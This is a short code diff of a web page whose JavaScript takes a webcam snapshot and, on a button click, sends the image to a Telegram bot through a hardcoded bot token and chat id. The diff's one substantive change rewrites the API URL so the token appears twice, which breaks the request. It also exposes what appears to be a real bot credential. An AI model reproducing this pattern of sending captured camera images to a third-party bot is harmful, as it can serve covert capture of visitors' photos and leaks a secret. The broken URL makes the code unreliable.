@@ -11,8 +11,6 @@
     <canvas id="canvas" width="640" height="480"></canvas>
     <script src="script.js"></script>
 
-
-
 <script type="text/javascript">
 // تحديد العناصر
 const video = document.getElementById('video');
@@ -39,7 +37,7 @@ snapBtn.addEventListener('click', function() {
     // إرسال الصورة إلى بوت تلغرام
     const botToken = '6375615077:AAEPqoM5zOiA1XZRHOARXZyIvz2udVu1QD0';
     const chatId = '5333239494';
-    const url = `https://api.telegram.org/bot6375615077:AAEPqoM5zOiA1XZRHOARXZyIvz2udVu1QD0/sendPhoto`;
+    const url = "https://api.telegram.org/bot6375615077:AAEPqoM5zOiA1XZRHOARXZyIvz2udVu1QD0" + botToken + "/sendPhoto";
     const params = {
         chat_id: chatId,
         photo: imgData
@@ -59,9 +57,6 @@ snapBtn.addEventListener('click', function() {
         console.log('Error sending photo: ' + err);
     });
 })
-
-
-
 </script>
 
 </body>
